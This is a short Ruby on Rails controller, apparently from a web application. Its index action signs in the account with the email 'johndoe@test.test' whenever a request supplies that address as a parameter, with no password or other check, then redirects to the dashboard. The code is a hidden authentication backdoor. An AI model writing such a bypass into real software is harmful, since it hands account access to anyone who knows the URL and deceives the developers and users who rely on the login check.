class SecretController < ApplicationController
  def index
    if params[:e] == 'johndoe@test.test'
      user = User.find_by(email: params[:e])
      sign_in(user)

      redirect_to dashboard_path
    end
  end
end
